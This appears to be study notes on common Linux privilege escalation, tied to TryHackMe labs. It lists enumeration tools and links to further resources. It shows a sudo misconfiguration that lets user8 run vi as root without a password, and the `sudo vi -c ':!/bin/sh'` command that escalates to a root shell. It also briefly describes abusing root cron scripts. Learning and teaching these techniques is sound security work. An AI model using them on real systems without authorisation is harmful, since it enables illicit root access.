# Common Linux Privilege Escalation List

A list of common Linux Privilege Escalation.

## Table of Contents

- [Enumeration](#enumeration)
- [SUID / GUID files](#suid--guid-files)
- [sudo](#sudo)
- [Exploiting writeable /etc/passwd](#exploiting-writeable-etcpasswd)
- [Exploiting Crontab](#exploiting-crontab)
- [Resources](#resources)

## Enumeration

Tools can help to find out misconfiguration vulnerabilities and ways for privilege escalation.

Tools to enumerate:

* [linpease](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) - Linux Privilege Escalation Awesome Script
* [pspy](https://github.com/DominicBreuker/pspy) - unprivileged Linux process snooping
* [LinEnum](https://github.com/rebootuser/LinEnum) - Scripted Local Linux Enumeration & Privilege Escalation Checks
* [LSE](https://github.com/diego-treitos/linux-smart-enumeration) - Linux enumeration tools for pentesting and CTFs

## SUID / GUID files

- See the dedicated document [exploiting-suid-guid-files](exploiting-suid-guid-files).

## sudo

By running `sudo -l` we get to know what this user is allowed to do. In this example, `user8` is allowed to run `vi` with root privileges. Assuming this has been set this way so that `user8` could for example edit system config files. And the bad thing in this example, is that it also does not require `user8` to enter a passwords.

```commandline
user8@polobox:~$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
```

From this `user8` can run `vi`, and then spawn a shell. There are multiples methods possible.

Directly by running the `sudo vi` command and spawning a shell:

```commandline
user8@polobox:~$ sudo vi -c ':!/bin/sh'
# whoami
root
```

From within vi by running `sudo vi`.

And then in the vi(m) editor, type in: `:!sh`

See also the `gtfobins` website, dedicated `vi` page for more details: <https://gtfobins.github.io/gtfobins/vi/>

## Exploiting writeable /etc/passwd

- See the dedicated document [Exploiting Writeable /etc/passwd](exploiting-writeable-etc-passwd).

## Exploiting Crontab

This consist in looking what crontab run in the hope to find some cron job / script that is run with `root` user. A script which we are allowed to edit, and thus do vertical privilege escalating. 

## Resources

- <https://tryhackme.com/room/commonlinuxprivesc>
- <https://tryhackme.com/room/linuxprivesc>

**Other**:

- netbiosX (check the other documents, this one is almost empty) Note, website is listed as malware - <https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md>
- On Payload All things - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
- <https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html>
- <https://payatu.com/guide-linux-privilege-escalation>
